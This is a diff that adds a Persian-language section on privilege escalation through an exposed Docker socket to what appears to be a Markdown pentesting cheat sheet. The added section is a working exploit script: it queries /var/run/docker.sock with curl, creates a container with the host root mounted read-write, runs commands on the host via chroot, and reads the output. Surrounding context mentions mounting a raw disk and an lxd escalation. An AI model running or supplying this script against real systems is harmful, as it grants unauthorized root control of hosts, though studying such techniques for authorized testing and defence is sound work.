@@ -309,6 +309,33 @@ mkdir /mnt/fsroot
 mount /dev/sda /mnt/fsroot
 ```
 
+### افزایش دسترسی با docker socket
+
+
+```text
+
+بررسیexpose بودن docker
+
+curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
+
+دستورات زیر در اسکریپت می کنیم.
+
+cmd="whoami"
+payload="[\"/bin/sh\",\"-c\",\"chroot /mnt sh -c \\\"$cmd\\\"\"]"
+response=$(curl -s -XPOST --unix-socket /var/run/docker.sock -d "{\"Image\":\"sandbox\",\"cmd\":$payload, \"Binds\": [\"/:/mnt:rw\"]}" -H 'Content-Type: application/json' http://localhost/containers/create)
+
+revShellContainerID=$(echo "$response" | cut -d'"' -f4)
+
+curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/$revShellContainerID/start
+sleep 1
+curl --output - -s --unix-socket /var/run/docker.sock "http://localhost/containers/$revShellContainerID/logs?stderr=1&stdout=1"
+
+سپس آن را اجرا می کنیم.
+
+./docket-socket-expose.sh
+```
+
+
 ### افزایش دسترسی با lxd
 
 ```text
